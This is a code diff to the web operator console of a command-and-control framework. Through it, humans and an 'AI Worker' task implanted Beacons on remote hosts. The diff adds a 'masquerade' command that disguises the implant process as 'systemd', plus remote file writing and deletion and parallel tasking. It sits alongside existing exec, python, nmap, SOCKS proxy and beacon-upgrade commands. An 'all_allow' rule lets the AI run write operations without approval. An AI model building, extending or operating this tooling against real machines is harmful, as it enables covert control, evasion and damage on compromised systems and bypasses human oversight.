@@ -125,7 +125,7 @@ Content-Type: application/json
 - AI 不需要写 l/w 前缀，直接下发基础命令：
   pwd, ls, cat, ps, sysinfo, whoami, env,
   mkdir, rm, mv, cp, tail, tee, dd, find, grep,
-  ping, nmap, exec, python, settings, tasks, killtask, upgrade, fork
+  ping, nmap, exec, python, settings, tasks, killtask, upgrade, fork, masquerade
 - 服务端按 Beacon.platform 自动解析：
   Linux -> l 开头实现
   Windows -> w 开头实现
@@ -145,8 +145,9 @@ Content-Type: application/json
 - killtask: {"task_id":"task_xxx"}
 - settings: {"fast_interval":4,"slow_interval":20,"current_interval":7,"jitter":0.1,"finish_delay":2,"max_concurrent_tasks":3}
   settings 未提供的字段保持原值
-- upgrade: {"host":"10.0.0.5","port":9001,"protocol":"tcp","key":"<base64 32字节>","token":"<可选>"}
+- upgrade: {"host":"192.0.2.10","port":9001,"protocol":"tcp","key":"<base64 32字节>","token":"<可选>"}
 - fork: {}
+- masquerade: {"new_name":"systemd"}  # Linux：伪装当前 Beacon 进程名
 
 九、AI 审批规则
 - all_allow: AI Worker 可以直接执行写操作
@@ -487,6 +488,17 @@ function Overview({ status, beacons, groups, globalAuto, tasks, listeners, appro
   const activeGroup = groups.find(g => g.id === groupFilter)
   const visibleBeacons = beacons.filter(b => !b.stashed && (groupFilter === 'all' || activeGroup?.beacon_ids?.includes(b.id)))
   const stashedBeacons = beacons.filter(b => b.stashed)
+  const heartbeatAgo = (value) => {
+    if (!value) return '—'
+    const timestamp = Date.parse(value)
+    if (Number.isNaN(timestamp)) return '—'
+    const seconds = Math.max(0, Math.floor((Date.now() - timestamp) / 1000))
+    if (seconds < 5) return '刚刚'
+    if (seconds < 60) return `${seconds} 秒前`
+    if (seconds < 3600) return `${Math.floor(seconds / 60)} 分钟前`
+    if (seconds < 86400) return `${Math.floor(seconds / 3600)} 小时前`
+    return `${Math.floor(seconds / 86400)} 天前`
+  }
 
   useLayoutEffect(() => {
     const page = pageRef.current
@@ -619,19 +631,21 @@ function Overview({ status, beacons, groups, globalAuto, tasks, listeners, appro
       {showStashed ? <div className="stashed-roster">
         <div className="stashed-head"><span>收纳区</span><small>{stashedBeacons.length} BEACONS</small></div>
         {stashedBeacons.map(b => <div className="stashed-row" key={b.id}>
-          <button className="link" onClick={() => openBeacon(b.id)}>{b.hostname}</button>
-          <span>{b.note || '无备注'}</span>
+          <button className="link stashed-host" onClick={() => openBeacon(b.id)}>{b.hostname}</button>
+          <span className="stashed-user">{b.username || '—'}</span>
+          <span className="mono stashed-time" title={b.last_seen || ''}>{heartbeatAgo(b.last_seen)}</span>
+          <span className="stashed-note">{b.note || '无备注'}</span>
           <Status status={b.status} />
           <span className="row-actions"><button className="link" onClick={() => openNote(b)}>备注</button><button className="link" onClick={() => setStash(b, false)}>恢复</button></span>
         </div>)}
         {!stashedBeacons.length && <div className="empty">收纳区为空</div>}
       </div> : <div className="table">
-        <div className="tr th"><span>主机</span><span>平台</span><span>协议</span><span>心跳间隔</span><span>状态</span><span>最后心跳</span><span>操作</span></div>
-        {visibleBeacons.map(b => <div className={`tr beac-row ${dragOverBeaconId === b.id ? 'drag-over' : ''}`} key={b.id} role="button" tabIndex={0} draggable={b.status === 'online'} onClick={() => openBeacon(b.id)} onKeyDown={e => e.key === 'Enter' && openBeacon(b.id)} onDragStart={e => { if (b.status !== 'online') return; setDragBeaconId(b.id); e.dataTransfer.effectAllowed = 'move' }} onDragOver={e => { if (dragBeaconId && b.status === 'online') { e.preventDefault(); setDragOverBeaconId(b.id) } }} onDragLeave={() => setDragOverBeaconId('')} onDrop={e => { e.preventDefault(); if (dragBeaconId) reorderBeacon(dragBeaconId, b.id) }} onDragEnd={() => { setDragBeaconId(''); setDragOverBeaconId('') }}>
-          <span className="host-cell"><span className="host-line">{b.status === 'online' && <span className="beacon-drag-handle" title="拖动调整显示顺序">⋮⋮</span>}<span>{b.hostname}</span></span>{b.note && <small>{b.note}</small>}</span>
-          <span>{b.platform}</span><span>{b.protocol}</span>
+        <div className="tr th"><span>主机</span><span>用户名</span><span>平台</span><span>协议</span><span>心跳间隔</span><span>状态</span><span>最后心跳</span><span>操作</span></div>
+        {visibleBeacons.map(b => <div className={`tr beac-row ${dragOverBeaconId === b.id ? 'drag-over' : ''}`} key={b.id} role="button" tabIndex={0} draggable onClick={() => openBeacon(b.id)} onKeyDown={e => e.key === 'Enter' && openBeacon(b.id)} onDragStart={e => { setDragBeaconId(b.id); e.dataTransfer.effectAllowed = 'move' }} onDragOver={e => { if (dragBeaconId) { e.preventDefault(); setDragOverBeaconId(b.id) } }} onDragLeave={() => setDragOverBeaconId('')} onDrop={e => { e.preventDefault(); if (dragBeaconId) reorderBeacon(dragBeaconId, b.id) }} onDragEnd={() => { setDragBeaconId(''); setDragOverBeaconId('') }}>
+          <span className="host-cell"><span className="host-line"><span className="beacon-drag-handle" title="拖动调整显示顺序">⋮⋮</span><span>{b.hostname}</span></span>{b.note && <small>{b.note}</small>}</span>
+          <span>{b.username || '—'}</span><span>{b.platform}</span><span>{b.protocol}</span>
           <span className="mono">{b.heartbeat_interval != null ? `${Math.round(b.heartbeat_interval)}s` : '—'}</span>
-          <span><Status status={b.status} /></span><span>{b.last_seen?.slice(11, 19)}</span>
+          <span><Status status={b.status} /></span><span className="mono" title={b.last_seen || ''}>{heartbeatAgo(b.last_seen)}</span>
           <span className="row-actions"><button className="link" onClick={e => { e.stopPropagation(); openNote(b) }}>备注</button><button className="link" onClick={e => { e.stopPropagation(); setStash(b, true) }}>收纳</button></span>
         </div>)}
         {!visibleBeacons.length && <div className="empty">当前分组没有 Beacon。</div>}
@@ -835,6 +849,10 @@ function commandArgs(cmdline, defaultPath) {
     }
     return { cmd, args }
   }
+  if (['masquerade', 'lmasquerade', 'wmasquerade'].includes(cmd)) {
+    args.new_name = rawRest.trim()
+    return { cmd, args }
+  }
   if (cmd === 'fork' || cmd === 'lfork' || cmd === 'wfork') {
     return { cmd, args }
   }
@@ -909,8 +927,8 @@ const COMMAND_HELP = {
   'mkdir': { args: 'path', placeholder: '/tmp/newdir' },
   'rm': { args: 'path', placeholder: '/tmp/file' },
   'tail': { args: 'path lines', placeholder: '/var/log/syslog 50' },
-  'ping': { args: 'host [ports]', placeholder: '10.0.0.1 80,443,22' },
-  'nmap': { args: 'host [ports]', placeholder: '10.0.0.1 1-1024' },
+  'ping': { args: 'host [ports]', placeholder: '192.0.2.10 80,443,22' },
+  'nmap': { args: 'host [ports]', placeholder: '192.0.2.10 1-1024' },
   'luname': { args: '', placeholder: '' },
   'lps': { args: '', placeholder: '' },
   'lnetstat': { args: '', placeholder: '' },
@@ -919,9 +937,21 @@ const COMMAND_HELP = {
   'tasks': { args: '', placeholder: '' },
   'killtask': { args: 'task_id', placeholder: 'task_xxxxxxxxx' },
   'settings': { args: '--min --max --current --jitter --finish --concurrency', placeholder: '--max 30 --min 5' },
-  'upgrade': { args: '--url|--host --port --protocol [--token] [--key]', placeholder: '--host 10.0.0.5 --port 9001 --protocol tcp' },
+  'upgrade': { args: '--url|--host --port --protocol [--token] [--key]', placeholder: '--host 192.0.2.10 --port 9001 --protocol tcp' },
   'fork': { args: '', placeholder: '' },
   'killbeacon': { args: '', placeholder: '' },
+}
+
+function blobToBase64(blob) {
+  return new Promise((resolve, reject) => {
+    const reader = new FileReader()
+    reader.onload = () => {
+      const result = String(reader.result || '')
+      resolve(result.includes(',') ? result.split(',', 2)[1] : result)
+    }
+    reader.onerror = () => reject(reader.error || new Error('读取本地文件失败'))
+    reader.readAsDataURL(blob)
+  })
 }
 
 function normalizeTaskData(task) {
@@ -936,7 +966,9 @@ function formatTaskOutput(task) {
       const type = entry.kind === 'dir' ? 'd' : entry.kind === 'error' ? '?' : '-'
       const mode = String(entry.mode || '----------')
       const modeText = mode.length >= 10 ? type + mode.slice(1) : type + '---------'
-      lines.push(`${modeText} ${String(entry.size ?? 0).padStart(10)}  ${entry.mtime || ''}  ${entry.name}`)
+      const owner = entry.owner ?? entry.uid ?? '—'
+      const group = entry.group ?? entry.gid ?? '—'
+      lines.push(`${modeText} ${owner}:${group} ${String(entry.size ?? 0).padStart(10)} ${entry.mtime || ''} ${entry.name}`)
     }
     if (data.truncated) lines.push('[result truncated by plugin/source limit]')
     return lines.join('\n')
@@ -1048,6 +1080,13 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
   const [fileEdit, setFileEdit] = useState('')
   const [fileMode, setFileMode] = useState('view')
   const [fileMsg, setFileMsg] = useState('')
+  const [createFileOpen, setCreateFileOpen] = useState(false)
+  const [createFileDir, setCreateFileDir] = useState('.')
+  const [createFileName, setCreateFileName] = useState('')
+  const [createFileContent, setCreateFileContent] = useState('')
+  const [createFileBusy, setCreateFileBusy] = useState(false)
+  const [deleteFileOpen, setDeleteFileOpen] = useState(false)
+  const [deleteFileBusy, setDeleteFileBusy] = useState(false)
   const [outputs, setOutputs] = useState([])
   const [taskHistory, setTaskHistory] = useState([])
   const [queueMsg, setQueueMsg] = useState('')
@@ -1060,6 +1099,9 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
   const [filter, setFilter] = useState({ pattern: '', mode: 'off' })
   const [nextFilter, setNextFilter] = useState('')
   const [busy, setBusy] = useState(false)
+  const terminalRef = useRef(null)
+  const terminalScrollRef = useRef({ top: 0, follow: true })
+  const [parallelTaskCount, setParallelTaskCount] = useState(0)
   const [pyName, setPyName] = useState('script')
   const [pyScript, setPyScript] = useState("import os\n\nprint('hello from', os.getcwd())\n")
   const [templates, setTemplates] = useState([])
@@ -1255,6 +1297,58 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
       }
     } catch (err) { setFileMsg(err.message) } finally { setBusy(false) }
   }
+  const openCreateFile = () => {
+    setCreateFileDir(path || '.')
+    setCreateFileName('')
+    setCreateFileContent('')
+    setCreateFileBusy(false)
+    setCreateFileOpen(true)
+  }
+  const createTargetFile = async () => {
+    const name = createFileName.trim()
+    if (!name) { setFileMsg('请输入文件名'); return }
+    const dir = (createFileDir.trim() || '.').replace(/\/+$/, '')
+    const targetPath = dir === '/' ? `/${name.replace(/^\/+/, '')}` : `${dir}/${name.replace(/^\/+/, '')}`
+    setCreateFileBusy(true); setFileMsg('')
+    try {
+      const taskRecord = await action('file.write', { beacon_id: beacon.id, path: targetPath, content: createFileContent, mode: 'overwrite' })
+      const task = await waitTask(taskRecord.id, state => {
+        if (state.status === 'dispatched') setFileMsg(`Beacon 已获取任务 · 正在创建 ${targetPath}`)
+      })
+      if (task.timedOut) throw new Error(`创建文件等待超时：${taskRecord.id}`)
+      if (task.status !== 'succeeded') throw new Error(task.error || `创建文件失败：${task.status || 'unknown'}`)
+      setCreateFileOpen(false)
+      setSelectedFile({ path: targetPath, name, text: createFileContent, binary: false, content_b64: '', truncated: false })
+      setFileEdit(createFileContent)
+      setFileMode('view')
+      setPath(dir || '.')
+      await loadDir(dir || '.')
+      setFileMsg(`文件已创建：${targetPath}`)
+    } catch (err) { setFileMsg(err.message) } finally { setCreateFileBusy(false) }
+  }
+  const openDeleteFile = () => {
+    if (!selectedFile?.path) { setFileMsg('请先选择要删除的文件'); return }
+    setDeleteFileOpen(true)
+  }
+  const deleteSelectedFile = async () => {
+    if (!selectedFile?.path) return
+    const target = selectedFile
+    setDeleteFileBusy(true); setFileMsg('')
+    try {
+      const taskRecord = await action('task.create', { beacon_id: beacon.id, plugin: 'rm', args: { path: target.path, recursive: false } })
+      const task = await waitTask(taskRecord.id, state => {
+        if (state.status === 'dispatched') setFileMsg(`Beacon 正在删除：${target.path}`)
+      })
+      if (task.timedOut) throw new Error(`删除等待超时：${taskRecord.id}`)
+      if (task.status !== 'succeeded') throw new Error(task.error || `删除失败：${task.status || 'unknown'}`)
+      setDeleteFileOpen(false)
+      setSelectedFile(null)
+      setFileEdit('')
+      setFileMode('view')
+      await loadDir(path)
+      setFileMsg(`已删除：${target.path}`)
+    } catch (err) { setFileMsg(err.message) } finally { setDeleteFileBusy(false) }
+  }
   const uploadToTarget = async (upload) => {
     if (!upload) return
     setBusy(true); setFileMsg(`上传 ${upload.name} …`)
@@ -1269,12 +1363,16 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
           beacon_id: beacon.id, path: targetPath, offset,
           mode: offset === 0 ? 'start' : 'append', content_b64,
         })
-        await waitTask(result.task.id)
+        const task = await waitTask(result.task.id, state => {
+          if (state.status === 'dispatched') setFileMsg(`上传 ${upload.name}: Beacon 正在写入 ${offset + chunk.size}/${upload.size} B`)
+        })
+        if (task.timedOut) throw new Error(`上传分块等待超时：${result.task.id}`)
+        if (task.status !== 'succeeded') throw new Error(task.error || `上传分块失败：${task.status || 'unknown'}`)
         offset += chunk.size
         setFileMsg(`上传 ${upload.name}: ${offset}/${upload.size} B`)
       } while (offset < upload.size)
-      setFileMsg(`上传完成：${targetPath}`)
       await loadDir(path)
+      setFileMsg(`上传完成：${targetPath} (${upload.size} B)`)
     } catch (err) { setFileMsg(err.message) } finally { setBusy(false) }
   }
   const downloadSelected = async () => {
@@ -1329,17 +1427,52 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
     return parts.includes(status) ? item : { ...item, status: [...parts, status].join(' → ') }
   }))
 
+  const trackCommandTask = async (entryId, taskRecord) => {
+    const taskId = taskRecord?.id || taskRecord?.task_id || ''
+    setParallelTaskCount(count => count + 1)
+    updateOutputTaskId(entryId, taskId)
+    updateTaskStatus(entryId, `已下发 · ${taskId}`)
+    updateOutput(entryId, '等待 Beacon 回连领取任务…')
+    try {
+      const done = await waitTask(taskId, state => {
+        if (state.status === 'dispatched') {
+          updateTaskStatus(entryId, `Beacon 已获取 · ${taskId}`)
+          updateOutput(entryId, 'Beacon 正在执行…')
+        } else if (state.status === 'queued') {
+          updateTaskStatus(entryId, `排队中 · ${taskId}`)
+        }
+      })
+      if (done.timedOut) {
+        updateTaskStatus(entryId, `等待超时 · ${done.status || 'unknown'}`)
+        updateOutput(entryId, 'Beacon 未领取任务，请检查 Beacon 是否在线或回连间隔。')
+      } else if (done.status === 'succeeded') {
+        updateTaskStatus(entryId, `执行完成 · ${done.status}`)
+        updateOutput(entryId, formatTaskOutput(done))
+      } else {
+        updateTaskStatus(entryId, `执行${done.status === 'cancelled' ? '取消' : '失败'} · ${done.status || 'unknown'}`)
+        updateOutput(entryId, done.error || formatTaskOutput(done))
+      }
+    } catch (err) {
+      updateTaskStatus(entryId, '轮询失败')
+      updateOutput(entryId, err.message)
+    } finally {
+      setParallelTaskCount(count => Math.max(0, count - 1))
+    }
+  }
+
   const runCommand = async (raw = input) => {
     const cmdline = String(raw || '').trim()
     if (!cmdline) return
     const parsed = commandArgs(cmdline, path)
     const cmd = parsed.cmd
     const args = parsed.args
-    const entry = { id: `local-${Date.now()}`, cmd: cmdline, output: '正在创建任务…', status: '' }
-    addOutput(entry); setInput(''); setShowSuggest(false); setBusy(true)
+    const entryId = crypto.randomUUID ? `local-${crypto.randomUUID()}` : `local-${Date.now()}-${Math.random().toString(16).slice(2)}`
+    const entry = { id: entryId, cmd: cmdline, output: '正在创建任务…', status: '' }
+    addOutput(entry); setInput(''); setShowSuggest(false)
     await recordHistory(cmdline, 'command')
-    try {
-      if (cmd === 'proxy' || cmd === 'socks') {
+    if (cmd === 'proxy' || cmd === 'socks') {
+      setBusy(true)
+      try {
         const tokens = parseCommandLine(cmdline).tokens
         const sub = String(tokens[1] || 'info').toLowerCase()
         let data
@@ -1350,28 +1483,16 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
         else if (sub === 'start') updateOutput(entry.id, `SOCKS5 已启动\n监听: 0.0.0.0:${data.port}\n用户名: ${data.username} 或目标 Beacon ID\n密码: ${data.password}\n活动会话: ${data.active_sessions || 0}`)
         else if (sub === 'stop') updateOutput(entry.id, `SOCKS5 已停止\n端口: ${data.port}`)
         else updateOutput(entry.id, JSON.stringify(data, null, 2))
-      } else {
-        const task = await runTaskAndWait(beacon.id, cmd, args, state => {
-          const id = state.id || state.task_id || ''
-          if (state.phase === 'created' || state.status === 'queued') {
-            if (id) updateOutputTaskId(entry.id, id)
-            updateTaskStatus(entry.id, `已下发 · ${id}`)
-            updateOutput(entry.id, '等待 Beacon 回连领取任务…')
-          } else if (state.status === 'dispatched') {
-            updateTaskStatus(entry.id, `Beacon 已获取任务 · ${id}`)
-            updateOutput(entry.id, 'Beacon 正在执行…')
-          }
-        })
-        if (task.timedOut) {
-          updateTaskStatus(entry.id, `等待超时 · ${task.status || 'unknown'}`)
-          updateOutput(entry.id, 'Beacon 未领取任务，请检查 Beacon 是否在线或回连间隔。')
-        } else {
-          updateTaskStatus(entry.id, `已完成 · ${task.status || 'unknown'}`)
-          updateOutput(entry.id, formatTaskOutput(task))
-        }
-      }
-    } catch (err) { updateOutput(entry.id, err.message) }
-    setBusy(false)
+      } catch (err) { updateOutput(entry.id, err.message) } finally { setBusy(false) }
+      return
+    }
+    try {
+      const task = await action('task.create', { beacon_id: beacon.id, plugin: cmd, args })
+      void trackCommandTask(entry.id, task)
+    } catch (err) {
+      updateOutput(entry.id, err.message)
+      updateTaskStatus(entry.id, '下发失败')
+    }
   }
 
   const stopQueue = async () => {
@@ -1418,7 +1539,9 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
         body: JSON.stringify({ name: pyName || 'script', source: pyScript }),
       })
       if (!data.ok) throw new Error(data.error || '保存失败')
-      setTemplateMsg(`模板已保存：${data.file}`)
+      const savedName = data.template?.name || data.file
+      setTemplateMsg(`模板已保存：${savedName}`)
+      setTemplateName(savedName)
       await loadTemplates()
     } catch (err) { setTemplateMsg(err.message) }
   }
@@ -1471,7 +1594,7 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
     ] },
     { id: 'network', label: '网络', items: [
       { label: '主机存活', command: 'ping', description: '对目标主机进行连通性探测。', params: [
-        { key: 'host', label: '目标主机 / IP', hint: '例如 192.168.1.1 或 example.com。', default: '127.0.0.1' },
+        { key: 'host', label: '目标主机 / IP', hint: '例如 192.0.2.10 或 example.com。', default: '127.0.0.1' },
       ], build: v => `ping ${shellQuote(v.host || '127.0.0.1')}` },
       { label: '端口扫描', command: 'nmap', description: '扫描目标主机的端口范围。', params: [
         { key: 'host', label: '目标主机 / IP', hint: '要扫描的主机名或 IP。', default: '127.0.0.1' },
@@ -1626,6 +1749,44 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
     history: true,
   }))
   const terminalEntries = [...serverHistoryEntries, ...outputs]
+  const terminalNearBottom = (element, threshold = 32) => !!element && element.scrollHeight - element.scrollTop - element.clientHeight <= threshold
+  const onTerminalScroll = (event) => {
+    const element = event.currentTarget
+    const top = element.scrollTop
+    if (top < terminalScrollRef.current.top - 1) terminalScrollRef.current.follow = false
+    else if (terminalNearBottom(element)) terminalScrollRef.current.follow = true
+    terminalScrollRef.current.top = top
+  }
+  useLayoutEffect(() => {
+    if (tab !== 'terminal') return
+    const element = terminalRef.current
+    if (!element) return
+    if (terminalScrollRef.current.follow) {
+      element.scrollTop = element.scrollHeight
+      terminalScrollRef.current.top = element.scrollTop
+    } else {
+      element.scrollTop = terminalScrollRef.current.top
+    }
+    return () => { if (terminalRef.current) terminalScrollRef.current.top = terminalRef.current.scrollTop }
+  }, [tab])
+  useEffect(() => {
+    if (tab !== 'terminal') return
+    const element = terminalRef.current
+    if (!element) return
+    const followBottom = () => {
+      if (!terminalScrollRef.current.follow) return
+      requestAnimationFrame(() => {
+        if (terminalRef.current && terminalScrollRef.current.follow) {
+          terminalRef.current.scrollTop = terminalRef.current.scrollHeight
+          terminalScrollRef.current.top = terminalRef.current.scrollTop
+        }
+      })
+    }
+    followBottom()
+    const observer = new MutationObserver(followBottom)
+    observer.observe(element, { childList: true, subtree: true, characterData: true })
+    return () => observer.disconnect()
+  }, [tab])
 
   return <div className="page beacon-page">
     <header className="page-head"><div><button className="link" onClick={onBack}>← 返回</button><div className="eyebrow">BEACON WORKSPACE</div><h1>{beacon.hostname}<span>_</span></h1><p>{beacon.id} · {beacon.platform} · {beacon.protocol} · {beacon.username}</p></div><Status status={beacon.status} /></header>
@@ -1635,11 +1796,11 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
       <div className="command-main">
         <Panel title="命令终端" eyebrow="EXECUTION" right={<span className="micro">{beacon.protocol} · {beacon.platform}</span>} className="terminal-panel">
           <LineFilter entries={outputs} filter={filter} setFilter={setFilter} nextFilter={nextFilter} setNextFilter={setNextFilter} />
-          <div className="terminal">{terminalEntries.map(entry => <div key={entry.id} className={`terminal-entry ${entry.history ? 'history-entry' : ''}`}><div className="cmdline"><span>{entry.history ? '↺' : 'λ'}</span><code>{entry.cmd}</code></div>{entry.status && <div className="task-status">{entry.status}</div>}<pre>{displayOutput(entry)}</pre></div>)}{busy && <div className="terminal-entry"><div className="cmdline"><span>◌</span><code>waiting…</code></div></div>}</div>
+          <div className="terminal" ref={terminalRef} onScroll={onTerminalScroll}>{terminalEntries.map(entry => <div key={entry.id} className={`terminal-entry ${entry.history ? 'history-entry' : ''}`}><div className="cmdline"><span>{entry.history ? '↺' : 'λ'}</span><code>{entry.cmd}</code></div>{entry.status && <div className="task-status">{entry.status}</div>}<pre>{displayOutput(entry)}</pre></div>)}{parallelTaskCount > 0 && <div className="terminal-entry"><div className="cmdline"><span>◌</span><code>并行任务 {parallelTaskCount} 个执行中…</code></div></div>}</div>
           <div className="cmd-input-wrap">
             {showSuggest && suggestions.length > 0 && <div className="suggestions">{suggestions.map(s => <button key={s} onClick={() => { setInput(s + ' '); setShowSuggest(false) }}>{s}</button>)}</div>}
             <div className="cmd-input"><span>λ</span><input value={input} placeholder="输入命令，如 ls /tmp、ps、exec id、cd /tmp、proxy start 1080" onChange={e => { setInput(e.target.value); setShowSuggest(true); setHistoryIndex(-1) }} onKeyDown={e => { if (e.key === 'Enter') { runCommand(); setHistoryIndex(-1) } if (e.key === 'ArrowUp') { e.preventDefault(); const next = Math.min(history.length - 1, historyIndex + 1); if (history[next] !== undefined) { setHistoryIndex(next); setInput(history[next]) } } if (e.key === 'ArrowDown') { e.preventDefault(); const next = Math.max(-1, historyIndex - 1); setHistoryIndex(next); setInput(next >= 0 ? history[next] : '') } if (e.key === 'Tab' && suggestions[0]) { e.preventDefault(); setInput(suggestions[0] + ' ') } }} /><button className="primary" onClick={() => runCommand()} disabled={busy}>执行</button><button className="ghost danger" onClick={stopQueue} disabled={stopBusy}>急停</button></div>
-            <div className="hint">Tab 补全 · ↑/↓ 本地命令历史 · 正则筛选仅影响显示{queueMsg && <span className="queue-stop-msg"> · {queueMsg}</span>}</div>
+            <div className="hint">Tab 补全 · ↑/↓ 本地命令历史 · 支持连续下发并行任务{parallelTaskCount > 0 ? ` · 并行执行中 ${parallelTaskCount}` : ''} · 正则筛选仅影响显示{queueMsg && <span className="queue-stop-msg"> · {queueMsg}</span>}</div>
           </div>
         </Panel>
         <Panel title="Python 脚本下发" eyebrow="LOCAL PYTHON CLIENT" right={<span className="micro">脚本不落目标磁盘</span>} className="python-panel">
@@ -1659,10 +1820,12 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
           <div className="hint">历史保存在本地客户端：<code>clients/local_data/history/</code>，每条命令一个 JSON 文件。</div>
         </Panel>
       </div>
-    </div> : tab === 'files' ? <div className="file-edit-workspace">
-      <Panel title="文件浏览器" eyebrow="DIRECTORY" className="file-panel" right={<div className="quick-buttons"><label className="file-upload">上传<input type="file" onChange={e => uploadToTarget(e.target.files?.[0])} /></label><button className="ghost" onClick={() => loadDir(path)} disabled={busy}>刷新</button></div>}>
+    </div> : tab === 'files' ? <>
+      <div className="file-edit-workspace">
+      <Panel title="文件浏览器" eyebrow="DIRECTORY" className="file-panel" right={<div className="quick-buttons"><button className="ghost" onClick={openCreateFile} disabled={busy}>＋ 新建文件</button><label className="file-upload">上传<input type="file" onChange={e => { const file = e.target.files?.[0]; e.target.value = ''; uploadToTarget(file) }} /></label><button className="ghost danger" onClick={openDeleteFile} disabled={!selectedFile?.path || busy}>删除</button><button className="ghost" onClick={() => loadDir(path)} disabled={busy}>刷新</button></div>}>
         <div className="path-row"><button className="ghost" onClick={() => loadDir(path === '/' ? '/' : path.split('/').slice(0, -1).join('/') || '/')}>↑</button><input value={path} onChange={e => setPath(e.target.value)} onKeyDown={e => e.key === 'Enter' && loadDir(path)} /><button className="ghost" onClick={() => loadDir(path)}>打开</button></div>
-        <div className="file-list">{entries.map(entry => <button key={entry.path || entry.name} className={`file-row ${selectedFile?.path === entry.path ? 'active' : ''}`} onClick={() => openFile(entry)}><span>{entry.kind === 'dir' ? '▸' : '·'}</span><span className="file-mode">{entry.mode || '—'}</span><span className="file-name">{entry.name}</span><span className="file-size">{entry.kind === 'dir' ? 'DIR' : `${entry.size} B`}</span><span className="file-time">{entry.mtime?.slice(5, 16) || '—'}</span></button>)}{!entries.length && <div className="empty">目录为空或尚未加载</div>}</div>
+        <div className="file-list-head"><span></span><span>权限</span><span>用户</span><span>用户组</span><span>名称</span><span>大小</span><span>修改时间</span></div>
+        <div className="file-list">{entries.map(entry => <button key={entry.path || entry.name} className={`file-row ${selectedFile?.path === entry.path ? 'active' : ''}`} onClick={() => openFile(entry)}><span>{entry.kind === 'dir' ? '▸' : '·'}</span><span className="file-mode">{entry.mode || '—'}</span><span className="file-owner">{entry.owner ?? entry.uid ?? '—'}</span><span className="file-group">{entry.group ?? entry.gid ?? '—'}</span><span className="file-name">{entry.name}</span><span className="file-size">{entry.kind === 'dir' ? 'DIR' : `${entry.size} B`}</span><span className="file-time">{entry.mtime?.slice(5, 16) || '—'}</span></button>)}{!entries.length && <div className="empty">目录为空或尚未加载</div>}</div>
         {fileMsg && <div className="hint">{fileMsg}</div>}
       </Panel>
       <Panel title={selectedFile ? selectedFile.path : '文件查看 / 编辑'} eyebrow="FILE EDITOR" className="file-editor-panel" right={selectedFile ? <div className="quick-buttons"><button className={fileMode === 'view' ? 'primary' : 'ghost'} onClick={() => setFileMode('view')}>查看</button><button className={fileMode === 'edit' ? 'primary' : 'ghost'} onClick={() => setFileMode('edit')} disabled={selectedFile.binary}>编辑</button><button className="ghost" onClick={downloadSelected} disabled={!selectedFile.path || busy}>下载</button></div> : null}>
@@ -1673,7 +1836,10 @@ function BeaconConsole({ beacon, plugins, listeners, onBack }) {
         </> : <div className="empty">在左侧选择文件查看或编辑。</div>}
         {fileMsg && <div className="hint">{fileMsg}</div>}
       </Panel>
-    </div> : <div className="beacon-control-page">{controlPanel}</div>}
+      </div>
+      {deleteFileOpen && <div className="modal-back"><div className="modal file-delete-modal"><div className="modal-head"><div><div className="eyebrow">DELETE REMOTE FILE</div><h2>删除文件</h2><p className="micro">删除后不可恢复，请确认目标路径。</p></div><button className="ghost" onClick={() => setDeleteFileOpen(false)} disabled={deleteFileBusy}>关闭</button></div><div className="file-delete-body"><span>目标路径</span><code>{selectedFile?.path || '—'}</code><p className="caution">该操作会直接在当前 Beacon 上删除目标文件。</p></div><div className="modal-actions"><button className="ghost" onClick={() => setDeleteFileOpen(false)} disabled={deleteFileBusy}>取消</button><button className="ghost danger" onClick={deleteSelectedFile} disabled={deleteFileBusy}>{deleteFileBusy ? '删除中…' : '确认删除'}</button></div></div></div>}
+      {createFileOpen && <div className="modal-back"><div className="modal file-create-modal"><div className="modal-head"><div><div className="eyebrow">CREATE REMOTE FILE</div><h2>新建文件</h2><p className="micro">在指定目录创建文本文件；同名文件会被覆盖。</p></div><button className="ghost" onClick={() => setCreateFileOpen(false)} disabled={createFileBusy}>关闭</button></div><div className="file-create-body"><label>目标目录 / 路径<input value={createFileDir} onChange={e => setCreateFileDir(e.target.value)} placeholder="例如 /tmp 或 ." /></label><label>文件名<input value={createFileName} onChange={e => setCreateFileName(e.target.value)} placeholder="例如 hello.txt" autoFocus /></label><div className="file-create-preview"><span>完整路径</span><code>{(() => { const dir = (createFileDir.trim() || '.').replace(/\/+$/, ''); const name = createFileName.trim().replace(/^\/+/, ''); return dir === '/' ? `/${name}` : `${dir}/${name}` })()}</code></div><label>文件内容<textarea className="file-create-content" value={createFileContent} onChange={e => setCreateFileContent(e.target.value)} placeholder="输入新文件内容…" spellCheck={false} /></label></div><div className="modal-actions"><button className="ghost" onClick={() => setCreateFileOpen(false)} disabled={createFileBusy}>取消</button><button className="primary" onClick={createTargetFile} disabled={createFileBusy || !createFileName.trim()}>{createFileBusy ? '创建中…' : '创建并写入'}</button></div></div></div>}
+    </> : <div className="beacon-control-page">{controlPanel}</div>}
     {quickDialog && <div className="modal-back"><div className="modal quick-action-modal"><div className="modal-head"><div><div className="eyebrow">QUICK COMMAND / {quickDialog.command}</div><h2>{quickDialog.label}</h2><p className="dim">{quickDialog.description}</p></div><button className="ghost" onClick={() => setQuickDialog(null)}>关闭</button></div>
       <div className="quick-modal-body">
         {quickDialog.params?.length > 0 ? <div className="quick-param-list">{quickDialog.params.map(param => <label key={param.key}><div className="quick-param-label"><span>{param.label}</span><small>{param.hint}</small></div><input type={param.type || 'text'} value={quickValues[param.key] ?? ''} onChange={e => setQuickValues(prev => ({ ...prev, [param.key]: e.target.value }))} autoFocus={quickDialog.params[0]?.key === param.key} /></label>)}</div> : <div className="quick-no-params">该命令不需要参数，点击执行后将发送到当前 Beacon 命令窗口。</div>}
@@ -1772,6 +1938,20 @@ const AI_GUIDE_DEFAULT = {
   HUMAN_TOKEN: '<Human Token>', AI_WORKER_TOKEN: '<AI Worker Token>', AI_APPROVAL_TOKEN: '<AI Approval Token>',
 }
 
+const AI_GUIDE_CONTEXT_FIELDS = [
+  ['server_url', '服务端控制 API', 'http://127.0.0.1:18080'],
+  ['local_web_url', '本地 Web 客户端', 'http://127.0.0.1:8765'],
